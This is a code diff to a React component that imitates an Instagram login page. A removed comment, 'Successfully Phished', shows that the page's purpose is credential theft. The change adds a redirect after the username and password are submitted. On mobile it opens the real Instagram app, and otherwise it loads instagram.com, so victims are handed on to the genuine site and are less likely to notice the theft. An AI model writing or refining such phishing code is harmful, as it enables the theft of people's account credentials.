@@ -75,9 +75,31 @@ export default function InstagramLogin() {
         console.error("API Error:", result.error)
         alert("Something went wrong: " + result.error)
       } else {
-        // Successfully Phished
         setFormData({ username: "", password: "" })
-        window.location.href = "https://instagram.com";
+
+        const instagramWebUrl = "https://instagram.com"
+
+        // Check if user is on mobile
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+
+        if (isMobile) {
+          // Try to open Instagram app based on platform
+          const instagramAppUrl = "instagram://app"
+
+          // Try opening the app
+          window.location.href = instagramAppUrl
+
+          // Fallback to website after a delay
+          setTimeout(() => {
+            // Check if page is still here (app didn't open)
+            if (document.visibilityState !== "hidden") {
+              window.location.href = instagramWebUrl
+            }
+          }, 1500)
+        } else {
+          // On desktop, just go to the website
+          window.location.href = instagramWebUrl
+        }
       }
     } catch (error) {
       console.error("Network error:", error)
